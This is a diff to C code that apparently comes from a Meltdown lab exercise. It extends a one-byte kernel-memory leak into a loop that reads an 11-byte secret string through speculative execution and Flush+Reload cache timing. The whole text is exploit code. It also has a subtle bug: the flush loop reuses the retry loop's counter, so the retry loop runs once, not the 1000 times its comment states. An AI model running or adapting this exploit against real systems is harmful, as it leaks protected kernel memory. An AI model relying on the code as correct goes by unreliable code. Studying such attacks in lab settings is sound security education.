@@ -13,6 +13,8 @@ uint8_t array[256*4096];
 /* cache hit time threshold assumed*/
 #define CACHE_HIT_THRESHOLD (330)
 #define DELTA 1024
+#define LENGTH_OF_SECRET (11)
+#define SECRET_ADDR 0xfb61b000
 
 void flushSideChannel()
 {
@@ -74,45 +76,53 @@ static void catch_segv()
 int main()
 {
   int i, j, ret = 0;
-  
-  // Register signal handler
-  signal(SIGSEGV, catch_segv);
+  int t;
+  char sec[LENGTH_OF_SECRET+1];
+  unsigned long addr = SECRET_ADDR;
+  for(t = 0; t < LENGTH_OF_SECRET; t++) {
+    // Register signal handler
+    signal(SIGSEGV, catch_segv);
 
-  int fd = open("/proc/secret_data", O_RDONLY);
-  if (fd < 0) {
-    perror("open");
-    return -1;
+    int fd = open("/proc/secret_data", O_RDONLY);
+    if (fd < 0) {
+      perror("open");
+      return -1;
+    }
+
+
+    memset(scores, 0, sizeof(scores));
+    flushSideChannel();
+    
+      
+    // Retry 1000 times on the same address.
+    for (i = 0; i < 1000; i++) {
+      ret = pread(fd, NULL, 0, 0);
+      if (ret < 0) {
+        perror("pread");
+        break;
+      }
+    
+      // Flush the probing array
+      for (i = 0; i < 256; i++) _mm_clflush(&array[i*4096 + DELTA]);
+
+      if (sigsetjmp(jbuf, 1) == 0) { meltdown_asm(addr); }
+
+      reloadSideChannelImproved();
+    }
+
+    // Find the index with the highest score.
+    int max = 0;
+    for (i = 0; i < 256; i++) {
+      if (scores[max] < scores[i]) max = i;
+    }
+    sec[t] = max;
+
+    printf("The secret value is %d %c\n", max, max);
+    printf("The number of hits is %d\n", scores[max]);
+    ++addr;
   }
-  
-  memset(scores, 0, sizeof(scores));
-  flushSideChannel();
-  
-	  
-  // Retry 1000 times on the same address.
-  for (i = 0; i < 1000; i++) {
-	ret = pread(fd, NULL, 0, 0);
-	if (ret < 0) {
-	  perror("pread");
-	  break;
-	}
-	
-	// Flush the probing array
-	for (j = 0; j < 256; j++) 
-		_mm_clflush(&array[j * 4096 + DELTA]);
-
-	if (sigsetjmp(jbuf, 1) == 0) { meltdown_asm(0xfb61b000); }
-
-	reloadSideChannelImproved();
-  }
-
-  // Find the index with the highest score.
-  int max = 0;
-  for (i = 0; i < 256; i++) {
-	if (scores[max] < scores[i]) max = i;
-  }
-
-  printf("The secret value is %d %c\n", max, max);
-  printf("The number of hits is %d\n", scores[max]);
-
+  sec[t] = '\0';
+  printf("Reading secret string at index %d\n", SECRET_ADDR);
+  printf("The secret string is: %s [%d]\n", sec, LENGTH_OF_SECRET);
   return 0;
 }
